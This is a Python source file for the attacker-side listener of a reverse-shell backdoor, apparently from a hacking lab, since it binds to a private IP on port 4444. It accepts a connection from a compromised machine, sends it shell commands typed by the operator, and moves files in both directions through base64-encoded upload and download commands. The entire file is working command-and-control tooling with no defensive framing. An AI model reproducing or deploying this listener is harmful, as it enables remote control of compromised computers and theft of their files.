#!/usr/bin/env python
import socket
import subprocess
import json
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            listener.bind((ip, port))
            listener.listen(0)
            self.connection, self.address = listener.accept()
            print(f"[+] Connection established with {str(self.address)}")
        except Exception as e:
            print(f"Error setting up listener: {e}")
            exit()

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode('utf-8'))
        except Exception as e:
            print(f"Error sending data: {e}")
            self.connection.close()
            exit()

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data.decode('utf-8'))
            except ValueError:
                continue
            except Exception as e:
                print(f"Error receiving data: {e}")
                self.connection.close()
                exit()

    def execute_remotely(self, command):
        try:
            self.reliable_send(command)
            return self.reliable_receive()
        except Exception as e:
            return f"Error executing remotely: {str(e)}"

    def write_file(self, path, content):
        try:
            with open(path, 'wb') as file:
                file.write(base64.b64decode(content))
                return "[+] Download Successful"
        except Exception as e:
            return f"Error saving file: {str(e)}"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode('utf-8')
        except FileNotFoundError:
            return f"[-] File not found: {path}"
        except Exception as e:
            return f"Error reading file: {str(e)}"

    def run(self):
        while True:
            try:
                command = input("$ ").strip().split(" ")
                if not command:
                    continue
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)
                if command[0] == "download":
                    result = self.write_file(command[1], result)
                print(result)
            except Exception as e:
                print(f"Error in Listener: {str(e)}")

my_listener = Listener("192.168.25.129", 4444)
my_listener.run()
